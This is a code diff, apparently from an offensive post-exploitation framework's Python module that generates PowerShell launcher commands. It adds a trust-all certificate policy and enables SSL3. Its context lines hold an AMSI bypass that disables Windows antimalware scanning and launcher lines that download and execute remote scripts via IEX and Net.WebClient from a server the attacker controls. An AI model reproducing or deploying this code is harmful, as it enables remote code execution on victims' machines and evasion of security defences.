@@ -69,7 +69,21 @@ def obfs_ps_script(path_to_script):
 
 def create_ps_command(ps_command, force_ps32=False, dont_obfs=False):
 
-    amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+    amsi_bypass = """
+add-type @"
+using System.Net;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {
+    public bool CheckValidationResult(
+        ServicePoint srvPoint, X509Certificate certificate,
+        WebRequest request, int certificateProblem) {
+        return true;
+    }
+}
+"@
+$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 try{
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 }catch{}
@@ -206,7 +220,22 @@ IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_scri
            command=command if post_back is False else '').strip()
 
     elif type(scripts) is list:
-        launcher = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n'
+        launcher = '''
+        add-type @"
+using System.Net;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {
+    public bool CheckValidationResult(
+        ServicePoint srvPoint, X509Certificate certificate,
+        WebRequest request, int certificateProblem) {
+        return true;
+    }
+}
+"@
+$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+'''
         for script in scripts:
             launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(server=context.server,
                                                                                                                       port=context.server_port,
